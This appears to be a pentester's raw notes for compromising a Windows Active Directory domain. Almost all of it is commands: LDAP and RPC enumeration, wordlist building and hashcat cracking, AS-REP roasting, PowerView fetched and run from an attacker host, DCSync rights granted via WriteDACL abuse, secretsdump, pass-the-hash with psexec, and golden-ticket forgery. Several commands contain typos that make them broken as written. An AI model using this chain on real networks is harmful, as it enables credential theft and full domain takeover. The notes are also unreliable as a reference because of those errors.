ldapsearch -h 1.1.1.1 -x -b "dc=domain,dc=local"

ldapsearch -h 1.1.1.1 -x -b "dc=domain,dc=local" '(objectClass=Person)'


ldapsearch -h 1.1.1.1 -x -b "dc=domain,dc=local" '(objectClass=Person)' sAMAccountName

> create own wordlist

January .. February .. December.. Password .. P@ssw0rd .. Sauna .. Secret .. Spring .. Windows .. Autumn..

for i in $(cat pwlist.txt); do echo $i; echo ${i}2019; echo {i}2020; done > t

hashcat --force --stdout pwlist -r /user/share/hashcat/best64.rule


for i in $(cat pwlist.txt); do echo $i; echo {i}!; done > t

hashcat --force --stdout pwlist -r /user/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort -u | wc -l


hashcat --force --stdout pwlist -r /user/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort -u | awk 'length($0) > 7' | wc -l

copy to pwlist.txt

crackmapexec smb 1.1.1.1 --pass-pol

crackmapexec smb 1.1.1.1 --pass-pol -u '' -p ''

rpcclient -U '' 1.1.1.1

enumdomusers
queryusergroups 
queryuser
..
enum4linux 1.1.1.1

crackmapexec  smb 1.1.1.1 -u ldap-anonymous.out -p userlist.ldap == bruteforce

polenum -h

polenum -u '' -p '' -d domena.local 1.1.1.1

./GetNPUsers.py -dc-ip 1.1.1.1 -request 'domena.local/'

./GetNPUsers.py -dc-ip 1.1.1.1 -request 'domena.local/' --format hashcat > hash.txt

hashcat -m 18200 hash/hash.txt wordlist -r rules/InsidePro-PasswordPro.rule

evil-winrm

>>

$pass = convertto=securestring 'Password123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('administrator', $cred)
New-PSDrive -Name drive -PSProvider FileSystem -Credential $cred -Root \\1.1.1.1\share

cd drive
WinPEAS.exe

bloodhound >>

locate neo4j "| grep auth
rm /usr/share.neo4j/data/dbms/auth << reset password to default
neo4j console

./BloodHount --no-sandbox

net user boh password123 /add /domain

net group "Exchange Windows Permission"

net group "Exchange Windows Permission" /add boh

net group "Exchange Windows Permission"

>> abuse WriteDACL, GenericAll

>> PowerView

git clone https://github.com/PowerShellMafia/PowerSploit/ -b dev

cd PowerSploit/Recon

python3 -m http.server 80 

IEX(New-Object New.WebClient).downloadString('http://1.1.1.1/PowerView.ps1')


$pass = convertto=securestring 'Password123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('domain\victim', $cred)
Add-DomainObjectAcl -Credential $cred -TargetIdentity domain.local -Rights DCSync
Add-DomainObjectAcl -Credential $cred -TargetIdentity "dc=domain,dc=local" -PrincipalIdentity victim -Rights DCSync

secretsdump.py

./secretsdump.py domain.local/victim:Password123@1.2.3.4

cat hashes.xt | grep ::: | awk -F: '{print $1":"$4}'

hashcat -m 1000 hashes.txt -r rules/InsidePro-PasswordPro.rule

hashcat --user -m 1000 hashes.txt -r rules/InsidePro-PasswordPro.rule

hashcat -m 1000 hashes.txt --show

crackmapexec smb 1.2.3.4 -u administrator -H 123123123123131313131

./psexec -hashes 12312313123123131231 administrator@1.2.3.4

golden ticket
-------------

Get-ADDomain >> copy S-I-D

impacket ticketer.py

ticketer.py -nthash (krbtgh-hash.....) -domain-sid .... -domain domain.local nonexistinguser 

>> creates ccache ticket

export KRBCCNAME=nonexistinguser.ccache

./psexec domain.local/nonexistinguser@1.1.1.1 -k -no-pass

(maybe add domain.local to /etc/hosts)

date -s 10:24:37

nmap -p 445 -sC -sV 1.1.1.1 (search for clock skew) 

